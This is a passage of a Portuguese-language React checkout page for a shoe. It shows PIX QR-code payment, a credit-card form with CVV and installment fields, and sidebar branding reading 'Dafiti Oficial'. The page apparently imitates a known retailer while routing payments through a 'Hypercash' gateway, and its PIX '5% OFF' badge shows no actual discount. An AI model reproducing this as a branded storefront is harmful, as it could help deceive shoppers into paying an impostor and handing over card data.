                        className="flex-1 bg-black hover:bg-neutral-900 active:scale-[0.99] text-white font-black py-4 rounded-2xl text-xs uppercase tracking-widest transition-all shadow-lg flex items-center justify-center gap-2"
                      >
                        <span>Ir Para Pagamento</span>
                        <ArrowRight size={15} />
                      </button>
                    </div>
                  </section>
                </form>
              )}

              {/* ETAPA 3: FORMA DE PAGAMENTO */}
              {currentStep === 3 && (
                <div className="space-y-6 animate-in fade-in duration-300">
                  {pixData.qrcodeText ? (
                    /* PIX GERADO NA ETAPA 3 */
                    <div className="bg-white p-6 sm:p-8 rounded-3xl border border-gray-200 shadow-xl space-y-6">
                      <div className="text-center space-y-1">
                        <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-50 text-amber-800 border border-amber-200 text-[11px] font-bold uppercase tracking-wider mb-2">
                          <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
                          Aguardando Pagamento
                        </div>
                        <h2 className="text-xl font-black uppercase tracking-tight text-gray-900">
                          PIX Gerado com Sucesso
                        </h2>
                        <p className="text-xs text-gray-500">
                          Abra o app do seu banco e escaneie o QR Code abaixo ou use o Copia e Cola.
                        </p>
                      </div>

                      {/* QR CODE BOX */}
                      <div className="bg-gray-50 border border-gray-200 rounded-3xl p-6 flex flex-col items-center justify-center space-y-4">
                        <div className="bg-white p-3.5 rounded-2xl shadow-md border border-gray-100">
                          <QRCodeSVG value={pixData.qrcodeText} size={200} level="M" />
                        </div>
                        <div className="text-center">
                          <div className="text-2xl font-black text-gray-900">{brl(TOTAL_PRICE_CENTS)}</div>
                          <div className="text-[11px] text-gray-500 font-medium mt-0.5">
                            {PRODUCT_NAME} • {currentColor.name} ({selectedSize}) + Frete
                          </div>
                        </div>
                      </div>

                      {/* PIX COPIA E COLA */}
                      <div className="space-y-2">
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600">
                          Código PIX Copia e Cola:
                        </label>
                        <textarea
                          readOnly
                          rows={2}
                          value={pixData.qrcodeText}
                          className="w-full rounded-2xl border border-gray-300 bg-gray-50 p-3 text-[11px] font-mono text-gray-700 select-all resize-none outline-none"
                        />
                        <button
                          type="button"
                          onClick={copyPix}
                          className={`w-full py-3.5 rounded-2xl font-bold text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-2 shadow ${
                            copied
                              ? "bg-emerald-600 text-white"
                              : "bg-[#005BFF] hover:bg-[#0047cc] text-white active:scale-[0.99]"
                          }`}
                        >
                          {copied ? <Check size={16} /> : <Copy size={16} />}
                          <span>{copied ? "Código PIX Copiado!" : "Copiar Código PIX"}</span>
                        </button>
                      </div>

                      {/* EXPIRATION & TIPS */}
                      <div className="border-t border-gray-100 pt-4 text-center space-y-3">
                        <div className="flex items-center justify-center gap-1.5 text-xs text-gray-500 font-medium">
                          <Clock size={14} className="text-amber-600" />
                          <span>
                            O código expira em:{" "}
                            <strong className="text-gray-900 font-mono">
                              {Math.floor(countdown / 60)}:{(countdown % 60).toString().padStart(2, "0")}
                            </strong>
                          </span>
                        </div>
                        <p className="text-[11px] text-gray-400">
                          ⚡ A aprovação é imediata. Assim que você pagar no seu banco, esta página será atualizada automaticamente!
                        </p>
                      </div>
                    </div>
                  ) : (
                    /* ESCOLHA DO MÉTODO DE PAGAMENTO */
                    <form onSubmit={handleFinishPayment} className="space-y-6">
                      <section className="bg-white p-5 sm:p-6 rounded-3xl border border-gray-200 shadow-xs space-y-4">
                        <div className="flex items-center justify-between border-b border-gray-100 pb-3">
                          <div className="flex items-center gap-2">
                            <CreditCard size={16} className="text-black" />
                            <h3 className="font-black text-xs uppercase tracking-widest text-gray-900">
                              Escolha a Forma de Pagamento
                            </h3>
                          </div>
                          <button
                            type="button"
                            onClick={() => setCurrentStep(2)}
                            className="text-xs text-gray-500 hover:text-black font-bold flex items-center gap-1"
                          >
                            <ChevronLeft size={14} /> Voltar
                          </button>
                        </div>

                        {/* TABS PIX / CARTÃO */}
                        <div className="grid grid-cols-2 gap-3">
                          <button
                            type="button"
                            onClick={() => setMethod("pix")}
                            className={`p-4 rounded-2xl border text-left transition-all relative ${
                              method === "pix"
                                ? "border-[#00873e] bg-emerald-50/40 ring-2 ring-[#00873e]"
                                : "border-gray-200 hover:border-gray-300 bg-white"
                            }`}
                          >
                            <div className="flex items-center justify-between mb-1.5">
                              <span className="font-black text-sm text-gray-900 flex items-center gap-1.5">
                                <QrCode size={18} className="text-[#00873e]" /> PIX
                              </span>
                              <span className="bg-[#00873e] text-white text-[10px] font-extrabold px-2 py-0.5 rounded-full">
                                5% OFF
                              </span>
                            </div>
                            <div className="text-lg font-black text-[#00873e]">
                              {brl(TOTAL_PRICE_CENTS)}
                            </div>
                            <div className="text-[11px] text-gray-500">Aprovação imediata</div>
                          </button>

                          <button
                            type="button"
                            onClick={() => setMethod("card")}
                            className={`p-4 rounded-2xl border text-left transition-all ${
                              method === "card"
                                ? "border-black bg-gray-50 ring-2 ring-black"
                                : "border-gray-200 hover:border-gray-300 bg-white"
                            }`}
                          >
                            <div className="flex items-center justify-between mb-1.5">
                              <span className="font-black text-sm text-gray-900 flex items-center gap-1.5">
                                <CreditCard size={18} className="text-gray-900" /> Cartão
                              </span>
                              <span className="text-[10px] text-gray-500 font-bold">Até 6x</span>
                            </div>
                            <div className="text-lg font-black text-gray-900">
                              {brl(TOTAL_PRICE_CENTS)}
                            </div>
                            <div className="text-[11px] text-gray-500">Em até 6x sem juros</div>
                          </button>
                        </div>

                        {/* CARTÃO DE CRÉDITO FIELDS (HYPERCASH) */}
                        {method === "card" && (
                          <div className="pt-3 border-t border-gray-100 space-y-3.5 animate-in fade-in duration-200">
                            <div>
                              <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                                Número do Cartão
                              </label>
                              <input
                                type="text"
                                placeholder="0000 0000 0000 0000"
                                value={card.number}
                                onChange={(e) => setCard({ ...card, number: maskCardNumber(e.target.value) })}
                                className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black font-mono"
                              />
                            </div>

                            <div>
                              <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                                Nome Impresso no Cartão
                              </label>
                              <input
                                type="text"
                                placeholder="NOME COMO NO CARTÃO"
                                value={card.holderName}
                                onChange={(e) => setCard({ ...card, holderName: e.target.value.toUpperCase() })}
                                className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black uppercase"
                              />
                            </div>

                            <div className="grid grid-cols-2 gap-3">
                              <div>
                                <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                                  Validade (MM/AA)
                                </label>
                                <input
                                  type="text"
                                  placeholder="MM/AA"
                                  value={card.expiry}
                                  onChange={(e) => setCard({ ...card, expiry: maskExpiry(e.target.value) })}
                                  className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black font-mono text-center"
                                />
                              </div>
                              <div>
                                <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                                  CVV
                                </label>
                                <input
                                  type="password"
                                  placeholder="123"
                                  maxLength={4}
                                  value={card.cvv}
                                  onChange={(e) => setCard({ ...card, cvv: onlyDigits(e.target.value) })}
                                  className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black font-mono text-center"
                                />
                              </div>
                            </div>

                            <div>
                              <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                                Parcelamento
                              </label>
                              <select
                                value={card.installments}
                                onChange={(e) => setCard({ ...card, installments: Number(e.target.value) })}
                                className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black font-medium"
                              >
                                <option value={1}>1x de {brl(TOTAL_PRICE_CENTS)} sem juros</option>
                                <option value={2}>2x de {brl(TOTAL_PRICE_CENTS / 2)} sem juros</option>
                                <option value={3}>3x de {brl(TOTAL_PRICE_CENTS / 3)} sem juros</option>
                                <option value={4}>4x de {brl(TOTAL_PRICE_CENTS / 4)} sem juros</option>
                                <option value={5}>5x de {brl(TOTAL_PRICE_CENTS / 5)} sem juros</option>
                                <option value={6}>6x de {brl(TOTAL_PRICE_CENTS / 6)} sem juros</option>
                              </select>
                            </div>
                          </div>
                        )}

                        {error && (
                          <div className="flex items-center gap-2 p-3 bg-rose-50 border border-rose-200 text-rose-700 text-xs rounded-2xl font-bold">
                            <AlertCircle size={16} className="shrink-0" />
                            <span>{error}</span>
                          </div>
                        )}

                        {/* FINAL SUBMIT BUTTON */}
                        <div className="flex gap-3 pt-2">
                          <button
                            type="button"
                            onClick={() => setCurrentStep(2)}
                            className="px-5 py-4 border border-gray-300 hover:border-black rounded-2xl text-xs font-bold uppercase tracking-wider transition-all"
                          >
                            Voltar
                          </button>
                          <button
                            type="submit"
                            disabled={loading}
                            className="flex-1 bg-black hover:bg-neutral-900 active:scale-[0.99] disabled:opacity-50 text-white font-black py-4 rounded-2xl text-xs uppercase tracking-widest transition-all shadow-lg flex items-center justify-center gap-2"
                          >
                            {loading ? (
                              <>
                                <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                                <span>Processando Pedido...</span>
                              </>
                            ) : (
                              <>
                                <Lock size={15} />
                                <span>
                                  {method === "pix"
                                    ? `Gerar PIX • ${brl(TOTAL_PRICE_CENTS)}`
                                    : `Pagar com Cartão • ${brl(TOTAL_PRICE_CENTS)}`}
                                </span>
                              </>
                            )}
                          </button>
                        </div>

                        <div className="pt-2 flex items-center justify-center">
                          <img
                            src={paymentBadgesImg}
                            alt="Bandeiras de pagamento"
                            className="h-6 w-auto object-contain opacity-80"
                          />
                        </div>
                      </section>
                    </form>
                  )}
                </div>
              )}
            </div>

            {/* RIGHT COLUMN: PRODUCT SHOWCASE SIDEBAR (5 cols) */}
            <div className="lg:col-span-5 space-y-5 sticky top-24">
              <div className="bg-white rounded-3xl border border-gray-200 shadow-xs overflow-hidden">
                {/* GALLERY */}
                <div className="relative aspect-square bg-gray-50">
                  <img
                    src={currentColor.images[activeImageIdx] || currentColor.images[0]}
                    alt={PRODUCT_NAME}
                    className="w-full h-full object-cover"
                  />
                  <div className="absolute top-3 left-3 bg-black/80 backdrop-blur-md text-white text-[10px] font-black uppercase px-2.5 py-1 rounded-full tracking-wider">
                    Dafiti Oficial
                  </div>
                </div>

                {/* THUMBNAILS */}
                {currentColor.images.length > 1 && (
                  <div className="p-3 bg-gray-50/50 border-t border-gray-100 flex gap-2">
                    {currentColor.images.map((img, idx) => (
                      <button
                        key={idx}
                        type="button"
                        onClick={() => setActiveImageIdx(idx)}
                        className={`w-14 h-14 rounded-xl overflow-hidden border transition-all ${
                          activeImageIdx === idx
                            ? "border-black ring-2 ring-black"
                            : "border-gray-200 opacity-60 hover:opacity-100"
                        }`}
                      >
                        <img src={img} alt="Miniatura" className="w-full h-full object-cover" />
                      </button>
                    ))}
                  </div>
                )}

                {/* SUMMARY DETAILS */}
                <div className="p-5 space-y-4">
                  <div>
                    <h2 className="text-base font-black uppercase tracking-tight text-gray-900">
                      {PRODUCT_NAME}
                    </h2>
                    <p className="text-xs text-gray-500 mt-0.5">
                      Cor: <strong>{currentColor.name}</strong> • Tam: <strong>{selectedSize} BR</strong>
                    </p>
                  </div>

                  {/* PRICE BREAKDOWN */}
                  <div className="border-t border-b border-gray-100 py-3 space-y-1.5 text-xs">
                    <div className="flex justify-between text-gray-600">
                      <span>Subtotal Produto:</span>
                      <span className="font-bold text-gray-900">{brl(PRODUCT_PRICE_CENTS)}</span>
                    </div>
                    <div className="flex justify-between text-gray-600">
                      <span className="flex items-center gap-1">
                        <Truck size={13} className="text-amber-600" /> Entrega Express (Correios):
                      </span>
                      <span className="font-bold text-amber-700">{brl(SHIPPING_FEE_CENTS)}</span>
                    </div>
                    <div className="border-t border-dashed border-gray-200 pt-2 flex items-baseline justify-between">
                      <div>
                        <span className="text-[11px] text-gray-400 line-through mr-2">
                          {brl(OLD_PRICE_CENTS)}
                        </span>
                        <span className="text-lg font-black text-gray-900">
                          {brl(TOTAL_PRICE_CENTS)}
                        </span>
                      </div>
                      <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded">
                        Economia de R$ 140,00
                      </span>
                    </div>
                  </div>

                  <ul className="text-xs text-gray-600 space-y-2">
                    <li className="flex items-center gap-2">
                      <Check size={14} className="text-[#00873e]" />
                      <span>Material Soft Touch anatômico e flexível</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <Check size={14} className="text-[#00873e]" />
                      <span>Salto bloco anti-impacto (5cm)</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <Check size={14} className="text-[#00873e]" />
                      <span>Troca grátis e descomplicada em 30 dias</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <Check size={14} className="text-[#00873e]" />
                      <span>Envio Correios com rastreamento oficial</span>
                    </li>
                  </ul>
                </div>
              </div>

              {/* SECURITY CARD */}
              <div className="bg-gray-100/80 rounded-3xl p-4 border border-gray-200 text-xs text-gray-600 space-y-2">
                <div className="flex items-center gap-2 font-bold text-gray-900">
                  <ShieldCheck size={16} className="text-[#00873e]" />
                  <span>Compra 100% Protegida Dafiti</span>
                </div>
                <p className="text-[11px] text-gray-500 leading-relaxed">
                  Seus dados são criptografados com certificado SSL de 256 bits. O pagamento é processado diretamente pelo gateway oficial com total segurança.
                </p>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
